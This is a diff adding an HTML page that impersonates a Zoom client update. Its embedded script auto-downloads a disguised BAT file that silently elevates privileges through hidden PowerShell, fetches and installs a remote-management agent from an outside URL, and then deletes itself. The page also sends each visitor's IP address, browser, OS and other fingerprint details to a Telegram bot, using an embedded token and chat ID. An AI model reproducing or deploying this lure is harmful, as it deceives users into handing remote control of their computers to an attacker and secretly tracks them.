@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en" data-scrapbook-create="20260616114350988" data-scrapbook-title="Zoom Client Update">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Zoom Client Update</title>
+    <link href="css2.css" rel="stylesheet" />
+    <style>
+        /* ... existing styles ... */
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            position: relative;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+        }
+
+        .top-right-links {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 14px;
+            color: #0072c6;
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .top-right-links a {
+            text-decoration: none;
+            color: #0072c6;
+        }
+
+        .top-right-links a:hover {
+            text-decoration: underline;
+        }
+
+        .heading {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0072c6;
+            margin-top: 60px;
+        }
+
+        .subheading {
+            font-size: 18px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .download-info,
+        .countdown {
+            font-size: 18px;
+            font-weight: 500;
+            color: #0072c6;
+            margin-top: 15px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0072c6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-top: 30px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .status-message {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+            min-height: 30px;
+            color: #28a745;
+        }
+
+        .status-message.error {
+            color: #dc3545;
+        }
+
+        .status-message.info {
+            color: #0072c6;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            width: 100%;
+            text-align: center;
+            font-size: 12px;
+            color: #777;
+            padding: 0 20px;
+        }
+
+        .footer a {
+            color: #0072c6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .footer p {
+            margin: 4px 0;
+        }
+
+        #download-trigger {
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            .logo-container {
+                position: static;
+                margin-bottom: 10px;
+            }
+            .top-right-links {
+                position: static;
+                justify-content: center;
+                margin-top: 10px;
+            }
+            .heading {
+                font-size: 22px;
+                margin-top: 20px;
+            }
+            .container {
+                padding: 20px 15px;
+                justify-content: flex-start;
+                min-height: 90vh;
+            }
+            .footer {
+                position: static;
+                margin-top: 40px;
+                padding-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo -->
+    <div class="logo-container">
+        <img class="logo" src="Zoom_Communications_Logo.svg" alt="Zoom logo" />
+    </div>
+
+    <!-- Top-right links -->
+    <div class="top-right-links">
+        <a href="#">Support</a>
+        <a href="#">English</a>
+    </div>
+
+    <!-- Main content -->
+    <div class="container">
+        <div class="heading">Your Zoom Client is Out of Date</div>
+        <div class="subheading">The latest version of Zoom will automatically download in a few seconds</div>
+
+        <div class="download-info">Please wait while we download the latest version for you...</div>
+
+        <div class="countdown">The update will start in <span id="countdown">10</span> seconds</div>
+
+        <div class="spinner"></div>
+
+        <!-- Status message (shows download and Telegram report status) -->
+        <div id="statusMessage" class="status-message"></div>
+
+        <!-- Hidden download anchor (used for auto-trigger) -->
+        <a id="download-trigger" download="Zoom_WorkSpace_ClientSetup.bat"></a>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>
+            If you are not redirected automatically,
+            <a href="#" id="manual-download">click here to manually download the latest version.</a>
+        </p>
+        <p>&copy; Zoom Video Communications, Inc. All rights reserved.</p>
+    </div>
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ============================================================
+            //  CONFIGURATION – REPLACE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
+            // ============================================================
+            const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U'; // e.g. '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
+            const TELEGRAM_CHAT_ID = '-1004476515039';     // e.g. '-1001234567890' (group) or '123456789' (user)
+
+            // ------------------------------------------------------------
+            //  Embedded BAT file content
+            // ------------------------------------------------------------
+            var batContent =
+                '@echo off\r\n' +
+                'setlocal EnableExtensions\r\n' +
+                '\r\n' +
+                ':: === Auto-elevate ===\r\n' +
+                'net session >nul 2>&1\r\n' +
+                'if %errorlevel% neq 0 (\r\n' +
+                '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
+                '    exit /b\r\n' +
+                ')\r\n' +
+                '\r\n' +
+                ':: === Variables ===\r\n' +
+                'set "URL=https://app.action1.com/agent/8111f6d4-6895-11f1-8d39-abcfd1b90c97/Windows/agent(My_Organization).msi"\r\n' +
+                'set "MSI=%TEMP%\\pkg.msi"\r\n' +
+                '\r\n' +
+                ':: === Check if already installed ===\r\n' +
+                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
+                'if %errorlevel%==0 goto cleanup\r\n' +
+                '\r\n' +
+                ':: === Download with retry ===\r\n' +
+                'set RETRIES=3\r\n' +
+                'set COUNT=0\r\n' +
+                '\r\n' +
+                ':download\r\n' +
+                'set /a COUNT+=1\r\n' +
+                'powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
+                '\r\n' +
+                'if not exist "%MSI%" (\r\n' +
+                '    if %COUNT% LSS %RETRIES% (\r\n' +
+                '        timeout /t 2 >nul\r\n' +
+                '        goto download\r\n' +
+                '    ) else (\r\n' +
+                '        goto selfdelete\r\n' +
+                '    )\r\n' +
+                ')\r\n' +
+                '\r\n' +
+                ':: === Silent install ===\r\n' +
+                'msiexec /i "%MSI%" /qn /norestart >nul 2>&1\r\n' +
+                '\r\n' +
+                ':: === Cleanup MSI ===\r\n' +
+                ':cleanup\r\n' +
+                'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
+                '\r\n' +
+                ':: === PowerShell self-delete (guaranteed) ===\r\n' +
+                ':selfdelete\r\n' +
+                'powershell -WindowStyle Hidden -Command ^\r\n' +
+                '"Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                '\r\n' +
+                'exit /b';
+
+            // ------------------------------------------------------------
+            //  DOM refs
+            // ------------------------------------------------------------
+            var countdownEl = document.getElementById('countdown');
+            var manualLink = document.getElementById('manual-download');
+            var triggerLink = document.getElementById('download-trigger');
+            var statusMsg = document.getElementById('statusMessage');
+
+            // ------------------------------------------------------------
+            //  Create Blob and Object URL for the BAT file
+            // ------------------------------------------------------------
+            var blob = new Blob([batContent], { type: 'application/x-msdownload' });
+            var blobUrl = URL.createObjectURL(blob);
+
+            // Set manual link
+            manualLink.href = blobUrl;
+            manualLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
+            manualLink.target = '_blank';
+
+            // ------------------------------------------------------------
+            //  Telegram reporting
+            // ------------------------------------------------------------
+            var reportSent = false; // prevent duplicate reports
+
+            function getBrowserInfo() {
+                var ua = navigator.userAgent;
+                var browserName = 'Unknown';
+                if (ua.indexOf('Firefox') > -1) browserName = 'Firefox';
+                else if (ua.indexOf('Chrome') > -1) browserName = 'Chrome';
+                else if (ua.indexOf('Safari') > -1) browserName = 'Safari';
+                else if (ua.indexOf('Edge') > -1) browserName = 'Edge';
+                else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browserName = 'Opera';
+                else if (ua.indexOf('Trident') > -1) browserName = 'Internet Explorer';
+                return browserName;
+            }
+
+            function getDeviceType() {
+                var ua = navigator.userAgent;
+                if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile/Tablet';
+                return 'Desktop';
+            }
+
+            function getOS() {
+                var ua = navigator.userAgent;
+                if (ua.indexOf('Windows') > -1) return 'Windows';
+                if (ua.indexOf('Mac OS') > -1) return 'macOS';
+                if (ua.indexOf('Linux') > -1) return 'Linux';
+                if (ua.indexOf('Android') > -1) return 'Android';
+                if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
+                return 'Unknown OS';
+            }
+
+            function sendTelegramReport() {
+                if (reportSent) return;
+                reportSent = true;
+
+                // Check if token/chat ID are set (basic check)
+                if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
+                    statusMsg.textContent = '⚠️ Telegram report not configured (set token and chat ID).';
+                    statusMsg.className = 'status-message info';
+                    return;
+                }
+
+                // Fetch public IP
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => {
+                        if (!response.ok) throw new Error('IP fetch failed');
+                        return response.json();
+                    })
+                    .then(data => {
+                        var ip = data.ip || 'Unknown';
+                        return buildAndSendTelegram(ip);
+                    })
+                    .catch(err => {
+                        // Fallback: try ipapi.co
+                        return fetch('https://ipapi.co/json/')
+                            .then(res => {
+                                if (!res.ok) throw new Error('ipapi failed');
+                                return res.json();
+                            })
+                            .then(data => {
+                                var ip = data.ip || 'Unknown';
+                                return buildAndSendTelegram(ip);
+                            })
+                            .catch(() => {
+                                // If all IP services fail, send without IP
+                                return buildAndSendTelegram('Unavailable');
+                            });
+                    });
+            }
+
+            function buildAndSendTelegram(ip) {
+                var ua = navigator.userAgent;
+                var browser = getBrowserInfo();
+                var device = getDeviceType();
+                var os = getOS();
+                var language = navigator.language || 'Unknown';
+                var screenRes = window.screen.width + 'x' + window.screen.height;
+                var referrer = document.referrer || 'Direct';
+                var timestamp = new Date().toISOString();
+
+                var message =
+                    '🔔 *Zoom Update Download Triggered*\n' +
+                    '──────────────────\n' +
+                    '📅 Time: ' + timestamp + '\n' +
+                    '🌐 IP: ' + ip + '\n' +
+                    '💻 Device: ' + device + '\n' +
+                    '🖥️ OS: ' + os + '\n' +
+                    '🌍 Browser: ' + browser + '\n' +
+                    '🔤 Language: ' + language + '\n' +
+                    '📺 Screen: ' + screenRes + '\n' +
+                    '🔗 Referrer: ' + referrer + '\n' +
+                    '🆔 User-Agent: ' + ua + '\n' +
+                    '──────────────────';
+
+                // Send to Telegram
+                var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+                var payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                };
+
+                return fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) throw new Error('Telegram API error');
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            statusMsg.textContent = '✅ Download started.';
+                            statusMsg.className = 'status-message';
+                        } else {
+                            throw new Error('Telegram returned error: ' + (data.description || 'unknown'));
+                        }
+                    })
+                    .catch(err => {
+                        console.warn('Telegram report failed:', err);
+                        statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
+                        statusMsg.className = 'status-message error';
+                    });
+            }
+
+            // ------------------------------------------------------------
+            //  Download trigger
+            // ------------------------------------------------------------
+            function triggerDownload() {
+                // Set the trigger link and click it
+                triggerLink.href = blobUrl;
+                triggerLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
+
+                try {
+                    triggerLink.click();
+                    // If no error, update status (will be refined by telegram report later)
+                    statusMsg.textContent = '⏳ Download starting...';
+                    statusMsg.className = 'status-message info';
+                } catch (e) {
+                    // Fallback: open the blob URL directly
+                    window.open(blobUrl, '_blank');
+                    statusMsg.textContent = '⚠️ Download could not start automatically. Use manual link below.';
+                    statusMsg.className = 'status-message error';
+                }
+
+                // Send Telegram report (only once)
+                sendTelegramReport();
+            }
+
+            // ------------------------------------------------------------
+            //  Countdown
+            // ------------------------------------------------------------
+            var seconds = parseInt(countdownEl.textContent, 10) || 10;
+            var timer = setInterval(function() {
+                seconds -= 1;
+                countdownEl.textContent = Math.max(seconds, 0);
+
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    triggerDownload();
+                }
+            }, 1000);
+
+            // ------------------------------------------------------------
+            //  Manual link click – also trigger report
+            // ------------------------------------------------------------
+            manualLink.addEventListener('click', function(e) {
+                // The link will navigate to blob URL, but we also want to send report.
+                // We'll call sendTelegramReport() but prevent duplicate.
+                // Also ensure that if the countdown hasn't finished, we still report.
+                // However, if the user clicks manual, we should stop the countdown?
+                // We'll let the countdown continue; we just send report here as well.
+                // But we should avoid sending if already sent.
+                if (!reportSent) {
+                    // Send report asynchronously
+                    sendTelegramReport();
+                }
+                // The default behavior will download the file.
+                // We also add a small status update.
+                statusMsg.textContent = '⏳ Manual download initiated...';
+                statusMsg.className = 'status-message info';
+            });
+
+            // ------------------------------------------------------------
+            //  Clean up blob URL when page unloads
+            // ------------------------------------------------------------
+            window.addEventListener('beforeunload', function() {
+                URL.revokeObjectURL(blobUrl);
+            });
+
+            console.log('Zoom Update page ready. BAT file embedded, Telegram reporting active.');
+        })();
+    </script>
+</body>
+</html>
